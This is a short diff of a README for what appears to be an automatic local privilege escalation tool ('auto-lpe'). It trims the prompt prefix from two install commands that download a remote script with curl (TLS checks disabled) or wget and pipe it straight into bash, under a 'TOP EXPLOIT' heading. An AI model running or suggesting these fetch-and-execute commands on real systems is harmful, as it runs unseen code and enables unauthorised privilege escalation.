@@ -34,13 +34,13 @@
 <div align="center"><h1>Curl</h1></div>
 
 ```
-root@127.0.0.1:~# bash -c "$(curl -fsSL https://raw.githubusercontent.com/vlain1337/auto-lpe/refs/heads/main/autolpe.sh -k)"	
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/vlain1337/auto-lpe/refs/heads/main/autolpe.sh -k)"	
 ```
 
 <div align="center"><h1>Wget</h1></div>
 
 ```
-root@127.0.0.1:~# bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/vlain1337/auto-lpe/refs/heads/main/autolpe.sh)"
+bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/vlain1337/auto-lpe/refs/heads/main/autolpe.sh)"
 ```
 <samp>
 <div align="center"><h1> TOP EXPLOIT</h1></div>
